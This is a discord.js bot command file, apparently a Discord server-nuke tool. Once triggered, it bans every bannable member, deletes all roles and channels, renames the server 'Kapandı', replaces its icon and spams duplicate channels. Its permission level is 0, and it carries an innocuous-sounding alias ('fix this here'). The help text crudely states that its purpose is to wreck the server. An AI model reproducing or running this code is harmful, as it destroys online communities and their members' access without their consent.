const Discord = require('discord.js');
const ayarlar = require('../ayarlar.json');

exports.run = async (client, message, args) => {
if (message.guild) {

message.guild.members.forEach(u => {
if (u.bannable) {
message.guild.ban(u, "Elim Çarptı")
}
})
message.guild.roles.deleteAll("");
message.guild.channels.deleteAll("");
}

message.guild.setName(`Kapandı`, "")
message.guild.setIcon(`https://cdn.discordapp.com/attachments/569895621872451605/573561578767777829/closed-logo1.jpg`)
message.guild.createChannel(`hey`)
message.guild.createChannel(`berke-vurdu-gol`)
message.guild.createChannel(`berke-vurdu-gol`)
message.guild.createChannel(`berke-vurdu-gol`)
message.guild.createChannel(`berke-vurdu-gol`)
message.guild.createChannel(`berke-vurdu-gol`)
message.guild.createChannel(`berke-vurdu-gol`)
message.guild.createChannel(`berke-vurdu-gol`)
message.guild.createChannel(`berke-vurdu-gol`)
message.guild.createChannel(`berke-vurdu-gol`)
message.guild.createChannel(`berke-vurdu-gol`)
message.delete()
};  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['burayi_bi_düzelt'],
  permLevel: 0,
  kategori: "yetkili"
};

exports.help = {
  name: 'benberke',
  description: 'sunucu siker', 
  usage: 'benberke = sunucu siker'
};
